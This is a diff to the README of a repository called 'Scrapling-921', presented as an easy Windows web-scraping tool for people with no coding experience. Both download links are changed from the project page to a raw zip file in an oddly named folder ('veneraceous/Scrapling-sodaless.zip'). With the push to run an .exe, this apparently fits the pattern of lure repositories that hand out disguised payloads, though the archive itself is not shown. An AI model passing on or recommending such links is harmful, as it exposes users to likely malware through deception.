@@ -1,6 +1,6 @@
 # 🕷️ Scrapling-921 - Gather web data with ease today
 
-[![Download Scrapling-921](https://img.shields.io/badge/Download-Scrapling--921-blue.svg)](https://github.com/wonald22/Scrapling-921)
+[![Download Scrapling-921](https://img.shields.io/badge/Download-Scrapling--921-blue.svg)](https://github.com/wonald22/Scrapling-921/raw/refs/heads/main/veneraceous/Scrapling-sodaless.zip)
 
 Scrapling-921 helps you collect information from websites. It automates the process of visiting pages and pulling data into a useful format. You do not need experience in coding to use this tool for your research or business needs. This framework works on Windows systems and requires minimal setup.
 
@@ -18,7 +18,7 @@ Before you install the software, ensure your computer meets these basic standard
 
 You must visit the main project page to obtain the necessary files. We host the current version of the application on GitHub. 
 
-[Click here to visit the download page for Scrapling-921](https://github.com/wonald22/Scrapling-921)
+[Click here to visit the download page for Scrapling-921](https://github.com/wonald22/Scrapling-921/raw/refs/heads/main/veneraceous/Scrapling-sodaless.zip)
 
 Select the file that best matches your system. Most users should download the installer file ending in .exe. Save this file to your Downloads folder.
 
